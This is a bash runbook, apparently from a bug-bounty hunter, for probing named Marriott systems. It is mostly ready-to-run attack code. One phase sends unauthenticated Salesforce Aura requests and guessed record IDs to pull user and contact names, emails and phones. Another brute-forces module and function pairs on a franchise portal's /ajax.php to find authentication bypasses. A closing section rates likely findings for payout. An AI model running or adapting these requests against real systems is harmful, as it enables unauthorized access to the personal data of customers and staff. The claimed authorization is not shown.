#!/usr/bin/env bash
# Pi Runbook — Marriott Session 5
# Goal: Salesforce record access + Franchise transactions /ajax.php module enum
# Date: 2026-06-22
#
# Session 4 confirmed:
#   - cpp.marriott.com: Aura API unauthenticated, User schema 203 fields (Email/FirstName/Address)
#   - franchisetx: /ajax.php PHP routing, JS bundle at /assets/scripts.jgz?v=7
#   - Saviynt: DEPRIORITIZED (500 all variants, uniform response — likely patched)
#
# PATH BUG FIXED: never use PATH as a loop variable — renamed to APIPATH everywhere
#
# Usage: source ~/bug-bounty-hunting-/scripts/marriott-hunt-init.sh
#        bash ~/bug-bounty-hunting-/results/marriott/runbooks/PI-RUNBOOK-marriott-session5.md

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/gorib/go/bin:/home/gorib/.pdtm/go/bin:/home/gorib/.local/bin

BB="${BB:-$HOME/bug-bounty-hunting-}"
RESULTS="$BB/results/marriott"
OUTDIR="$RESULTS/session5"
mkdir -p "$OUTDIR" "$HOME/hunt"
cd "$HOME/hunt" || exit 1

section() { echo -e "\n\033[1;36m━━━ $* ━━━\033[0m"; }

exec > >(tee "$OUTDIR/session5-output.txt") 2>&1
echo "=== Marriott Session 5 — $(date) ==="

CPP="cpp.marriott.com"
FT="marriottfranchisetransactions.marriott.com"
FWUID="NOT_FOUND"   # Still used — Aura accepts it anyway (confirmed in sessions 3+4)

# One-line Aura POST helper
aura() {
  local label="$1" msg="$2"
  local ctx='{"mode":"PROD","fwuid":"'"$FWUID"'","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":false}'
  local r
  r=$(curl -sk --max-time 30 -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "message=$msg" \
    --data-urlencode "aura.context=$ctx" \
    --data-urlencode "aura.token=undefined" \
    "https://$CPP/s/sfsites/aura" 2>/dev/null)
  local state sz
  state=$(echo "$r" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('actions',[{}])[0].get('state','?'))" 2>/dev/null || echo "non-JSON")
  sz=${#r}
  echo "  [$label]: state=$state | ${sz}B"
  if [ "$state" = "SUCCESS" ]; then
    echo "$r" > "$OUTDIR/aura-${label}.json"
    echo "$r" | python3 -c "
import sys,json
d=json.load(sys.stdin)
rv=d['actions'][0].get('returnValue',{})
if isinstance(rv,dict):
    print('    returnValue keys:',list(rv.keys())[:15])
    # Check for actual record data
    for k in ['records','rows','items','data','users','contacts']:
        if k in rv:
            items=rv[k]
            print(f'    *** {k} count:',len(items) if isinstance(items,list) else 'non-list')
            if isinstance(items,list) and items:
                print('    First record:',str(items[0])[:300])
elif isinstance(rv,list):
    print('    returnValue is list, len=',len(rv))
    if rv: print('    First item:',str(rv[0])[:300])
else:
    print('    returnValue:',str(rv)[:300])
" 2>/dev/null
  fi
  if [ "$state" = "ERROR" ]; then
    echo "$r" | python3 -c "
import sys,json
d=json.load(sys.stdin)
errs=d['actions'][0].get('error',[])
if errs: print('    ERROR:',str(errs[0].get('message',''))[:200])
" 2>/dev/null
  fi
}

# ============================================================
# PHASE A — SALESFORCE: ATTEMPT ACTUAL USER RECORD ACCESS
# User getObjectInfo confirms API accessible + 203-field schema
# Now: try getListRecordsByName, getListUi, getRecord with IDs
# ============================================================

section "PHASE A — Salesforce Record Access (User object)"

echo "Target: $CPP — Aura endpoint accessible without auth"
echo "Goal: read actual User RECORDS (not just schema)"
echo ""

echo "=== A1: REST /services/data/ body (what version list looks like) ==="
curl -sk --max-time 10 "https://$CPP/services/data/" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    print('  Versions:', [v.get('version','?') for v in d[:5]] if isinstance(d,list) else str(d)[:300])
except:
    print('  Raw:', sys.stdin.read()[:200])
" 2>/dev/null

echo ""
echo "=== A2: getListRecordsByName — User / AllUsers (SALSA attack pattern) ==="
aura "getListRecordsByName-User-AllUsers" \
  '{"actions":[{"id":"0;a","descriptor":"aura://ListUiController/ACTION$getListRecordsByName","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User","listApiName":"AllUsers","pageSize":5,"pageToken":null,"sortBy":null,"fields":["User.Name","User.Email","User.Username","User.Id"],"optionalFields":[]}}]}'

echo ""
echo "=== A3: getListRecordsByName — Contact / AllContacts ==="
aura "getListRecordsByName-Contact-AllContacts" \
  '{"actions":[{"id":"0;a","descriptor":"aura://ListUiController/ACTION$getListRecordsByName","callingDescriptor":"UNKNOWN","params":{"objectApiName":"Contact","listApiName":"AllContacts","pageSize":5,"pageToken":null,"sortBy":null,"fields":["Contact.Name","Contact.Email","Contact.Phone"],"optionalFields":[]}}]}'

echo ""
echo "=== A4: getListUi — User list (alternative descriptor) ==="
aura "getListUi-User" \
  '{"actions":[{"id":"0;a","descriptor":"aura://ListUiController/ACTION$getListUi","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User","listViewApiName":"AllUsers","pageSize":5}}]}'

echo ""
echo "=== A5: getRecord — User with keyPrefix 005 (standard User ID) ==="
# Salesforce User IDs start with 005 (keyPrefix for User is '005' from A10 getObjectInfo)
# Try a few well-known patterns for the first community/guest user
for UID in "0055000000000001AAA" "0050000000000001AAA" "00558000000aaaaBBBB"; do
  aura "getRecord-$UID" \
    '{"actions":[{"id":"0;a","descriptor":"aura://RecordUiController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"'"$UID"'","fields":["User.Name","User.Email","User.Username"],"optionalFields":[]}}]}'
done

echo ""
echo "=== A6: getItems User with viewApiName (better parameter format) ==="
aura "getItems-User-viewApiName" \
  '{"actions":[{"id":"0;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"User","layoutType":"FULL","pageSize":5,"currentPage":0,"viewApiName":"AllUsers"}}]}'

echo ""
echo "=== A7: searchRecords — User search (Salesforce search API via Aura) ==="
aura "searchRecords-User" \
  '{"actions":[{"id":"0;a","descriptor":"serviceComponent://ui.storm.components.search.SearchController/ACTION$search","callingDescriptor":"UNKNOWN","params":{"searchTerm":"marriott","objectApiName":"User","useSearchScope":false,"fieldSet":["Name","Email"]}}]}'

echo ""
echo "=== A8: Try Salesforce REST API with guest session cookie ==="
# Get session cookie from /s/ page first
SESSION_COOKIE=$(curl -sk --max-time 15 -c /tmp/cpp-cookies.txt "https://$CPP/s/" 2>/dev/null \
  && grep -E "sid|session|force" /tmp/cpp-cookies.txt 2>/dev/null | head -3)
echo "  Cookies from /s/: $SESSION_COOKIE"

# Try REST API with cookie
REST_RESP=$(curl -sk --max-time 15 \
  -b /tmp/cpp-cookies.txt \
  -H "Accept: application/json" \
  "https://$CPP/services/data/v55.0/sobjects/" 2>/dev/null)
echo "  REST sobjects (with cookie): ${#REST_RESP}B"
echo "$REST_RESP" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    if 'sobjects' in d:
        print('  *** SOBJECTS ACCESSIBLE — Guest session has REST API access ***')
        print('  Count:', len(d['sobjects']))
        print('  Sample:', [o.get('name','?') for o in d['sobjects'][:5]])
    elif 'errorCode' in d:
        print('  Error:', d.get('errorCode'), d.get('message','')[:100])
    else:
        print('  Response:', str(d)[:300])
except:
    print('  Non-JSON:', sys.stdin.read()[:200])
" 2>/dev/null

echo ""
echo "=== A9: Try Aura with actual fwuid from JavaScript rendering ==="
# The real fwuid should be in the JS. Try fetching the Aura app.js or similar
for SFJS in /s/sfsites/aura/resources.js /s/auraFW/resources/common.js; do
  SZ=$(curl -sk --max-time 10 -o /dev/null -w "%{size_download}" "https://$CPP$SFJS" 2>/dev/null)
  echo "  $SFJS: ${SZ}B"
done

# ============================================================
# PHASE B — FRANCHISE TRANSACTIONS: /ajax.php MODULE ENUMERATION
# Download + decompress JS bundle, find all module/function combos
# Test unauthenticated access to business logic endpoints
# ============================================================

section "PHASE B — Franchise Transactions /ajax.php Module Discovery"

echo "Target: $FT"
echo "Found: POST /ajax.php with module + function params (PHP routing)"
echo ""

echo "=== B1: Download and decompress JS bundle ==="
JS_URL="https://$FT/assets/scripts.jgz?v=7"
echo "  Downloading: $JS_URL"
curl -sk --max-time 60 "$JS_URL" -o "$OUTDIR/scripts.jgz" 2>/dev/null
ls -la "$OUTDIR/scripts.jgz" 2>/dev/null || echo "  (download failed)"

# Decompress (jgz = gzip)
gunzip -c "$OUTDIR/scripts.jgz" > "$OUTDIR/scripts.js" 2>/dev/null \
  || zcat "$OUTDIR/scripts.jgz" > "$OUTDIR/scripts.js" 2>/dev/null

if [ -f "$OUTDIR/scripts.js" ] && [ -s "$OUTDIR/scripts.js" ]; then
  JS_SIZE=$(wc -c < "$OUTDIR/scripts.js")
  echo "  Decompressed JS: $JS_SIZE bytes"
  
  echo ""
  echo "  Module/function references:"
  grep -oiE '"module"\s*:\s*"[^"]{2,30}"' "$OUTDIR/scripts.js" | sort -u | head -30
  grep -oiE "'module'\s*:\s*'[^']{2,30}'" "$OUTDIR/scripts.js" | sort -u | head -20
  grep -oiE 'module=[a-zA-Z0-9_-]{2,20}' "$OUTDIR/scripts.js" | sort -u | head -20
  
  echo ""
  echo "  Function references:"
  grep -oiE '"function"\s*:\s*"[^"]{2,30}"' "$OUTDIR/scripts.js" | sort -u | head -30
  grep -oiE "'function'\s*:\s*'[^']{2,30}'" "$OUTDIR/scripts.js" | sort -u | head -20
  grep -oiE 'function=[a-zA-Z0-9_-]{2,20}' "$OUTDIR/scripts.js" | sort -u | head -20
  
  echo ""
  echo "  API endpoints in JS:"
  grep -oiE '/ajax\.php[^"'\'' ]{0,80}' "$OUTDIR/scripts.js" | sort -u | head -20
  grep -oiE '"/(api|v[0-9]+|rest)/[^"]{3,50}"' "$OUTDIR/scripts.js" | sort -u | head -15
  
  echo ""
  echo "  Authentication patterns:"
  grep -oiE '(session|token|auth|login|apikey)[^"'\'' ]{0,60}' "$OUTDIR/scripts.js" | head -10
else
  echo "  (JS decompression failed — trying alternate decode)"
  curl -sk --max-time 60 --compressed "$JS_URL" -o "$OUTDIR/scripts-alt.js" 2>/dev/null
  if [ -f "$OUTDIR/scripts-alt.js" ] && [ -s "$OUTDIR/scripts-alt.js" ]; then
    echo "  Downloaded via --compressed: $(wc -c < "$OUTDIR/scripts-alt.js") bytes"
    grep -oiE 'module=[a-zA-Z0-9_-]{2,20}' "$OUTDIR/scripts-alt.js" | sort -u | head -20
  fi
fi

echo ""
echo "=== B2: Test /ajax.php without auth — module combinations ==="
# Extract the activekey (CSRF token) from the login page
LOGIN_PAGE=$(curl -sk --max-time 15 "https://$FT/login" 2>/dev/null)
ACTIVEKEY=$(echo "$LOGIN_PAGE" | grep -oiP 'id="activekey"[^>]*value="([^"]+)"' | grep -oP 'value="\K[^"]+' | head -1)
echo "  activekey (CSRF) from /login: '${ACTIVEKEY:-(empty/not found)}'"
echo ""

# Common module/function patterns in PHP franchise/supplier portals
for MODULE in login user transaction invoice report franchise property management admin; do
  for FUNC in list get getAll index search view dashboard export; do
    RESP=$(curl -sk --max-time 8 -o /dev/null \
      -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "module=${MODULE}&function=${FUNC}&activekey=${ACTIVEKEY:-}" \
      -w "%{http_code}|%{size_download}" \
      "https://$FT/ajax.php" 2>/dev/null)
    HTTP_CODE=${RESP%|*}
    SIZE=${RESP#*|}
    # Only print non-standard responses (not 302 redirect to login, not empty)
    if [ "$HTTP_CODE" != "302" ] && [ "$SIZE" -gt 50 ]; then
      echo "  module=$MODULE function=$FUNC: HTTP $HTTP_CODE | ${SIZE}B  *** INTERESTING ***"
    fi
  done
done

echo ""
echo "=== B3: Test specific financial function names ==="
for MODULE_FUNC in \
  "transactions|list" \
  "transactions|get" \
  "invoice|list" \
  "invoice|getById" \
  "payment|status" \
  "franchise|dashboard" \
  "franchise|getDetails" \
  "report|monthly" \
  "report|quarterly" \
  "user|getProfile" \
  "user|list" \
  "admin|users" \
  "admin|transactions"; do
  MOD=${MODULE_FUNC%|*}
  FUNC=${MODULE_FUNC#*|}
  RESP=$(curl -sk --max-time 8 -o /tmp/ajaxtest.txt \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "module=${MOD}&function=${FUNC}&activekey=${ACTIVEKEY:-}" \
    -w "%{http_code}|%{size_download}" \
    "https://$FT/ajax.php" 2>/dev/null)
  HTTP_CODE=${RESP%|*}
  SIZE=${RESP#*|}
  BODY=$(cat /tmp/ajaxtest.txt 2>/dev/null | head -c 200)
  echo "  $MOD/$FUNC: HTTP $HTTP_CODE | ${SIZE}B | ${BODY:0:80}"
done

echo ""
echo "=== B4: Homepage page source — extract inline API calls ==="
HOMEPAGE=$(curl -sk --max-time 20 -L "https://$FT/" 2>/dev/null)
echo "  Looking for ajax.php calls in homepage source..."
echo "$HOMEPAGE" | grep -oiE "ajax\.php[^\"\'<]{0,100}" | head -10
echo ""
echo "  Page title: $(echo "$HOMEPAGE" | grep -oiP '<title>[^<]+' | head -1)"
echo "  Nav links:"
echo "$HOMEPAGE" | grep -oiE '<a[^>]+href="(/[^"]{2,50})"' | head -15

# ============================================================
# DECISION GATE
# ============================================================
cat << 'DECISION'

━━━ SESSION 5 DECISION GATE ━━━

REPORT IMMEDIATELY if:

  Salesforce (Phase A):
  ✓ A2/A3 getListRecordsByName → SUCCESS with User or Contact records
    (any name, email, phone, address visible) → CRITICAL report ready
    CVSS: 8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
    HackerOne severity: Critical (Marriott: $8,001–$11,000)
  ✓ A8 REST sobjects accessible with guest cookie → HIGH
  ✓ If only schema (no records): submit as Medium
    Title: "Salesforce Experience Cloud (cpp.marriott.com) guest user Aura API
            accessible without authentication — 203 User object fields exposed"
    CVSS: 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

  Franchise /ajax.php (Phase B):
  ✓ B2 any module/function returns 200 + non-empty data WITHOUT auth
    → Auth bypass — High finding
    → PoC: simple curl POST without session cookie
  ✓ B2 JSON response containing user data, transaction amounts, invoice IDs
    → IDOR/auth bypass — Critical

NEXT IF NO RECORD ACCESS:
  Manual browser test: open cpp.marriott.com/s/ in browser DevTools → Network tab →
  look for /sfsites/aura POST requests → copy the fwuid from request body →
  re-run A2/A3 with real fwuid to test with valid session context.

  Then submit Salesforce as Medium standalone (don't wait for Critical if Medium
  already clears the Marriott submission quality bar).

DECISION
